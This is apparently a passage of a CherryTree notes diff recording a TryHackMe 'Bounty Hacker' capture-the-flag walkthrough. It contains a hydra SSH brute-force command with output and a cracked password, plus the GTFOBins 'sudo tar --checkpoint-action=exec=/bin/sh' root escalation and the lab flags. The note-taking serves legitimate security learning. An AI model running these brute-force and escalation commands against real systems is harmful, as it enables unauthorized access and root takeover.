+4- task was to name the person who worte task.txt and answer was lin(get task.txt) from ftp to my machine
+5- locks.txt contained  passwords
+6- Now iUsing hydra to bruteforce lin 
+7- bruteforce success  (host: 10.10.82.20   login: lin   password: RedDr4gonSynd1cat3)
+8- user flag(THM{CR1M3_SyNd1C4T3})
+
+ #PRIV ESC time
+
+ 9- RAn sudo -l to check if we have sudo privelges or not
+ 
+ [sudo] password for lin: 
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+10-  visited gtfobins for binary abuse
+
+
+</rich_text>
+      <rich_text scale="h2">Sudo</rich_text>
+      <rich_text>
+If the binary is allowed to run as superuser by </rich_text>
+      <rich_text family="monospace">sudo</rich_text>
+      <rich_text>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+        •                 </rich_text>
+      <rich_text family="monospace">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</rich_text>
+      <rich_text>    
+    
+11- ran this and got a root shell but unstable one
+12- used tty stable (bash -i) for stable shell
+13- cd to root and get that root shell */\*
+14- root flag (THM{80UN7Y_h4cK3r})
+yayyyyyy</rich_text>
+    </node>
+    <node name="hydra(for ssh bruteforce)" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1613911689" ts_lastsave="1613911691">
+      <rich_text>hydra -l lin -P locks.txt ssh://10.10.82.20                                                              
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-21 07:46:48
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://10.10.82.20:22/
+[22][ssh] host: 10.10.82.20   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 6 final worker threads did not complete until end.
+[ERROR] 6 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-21 07:47:08
+</rich_text>
+    </node>
+  </node>
+</cherrytree>
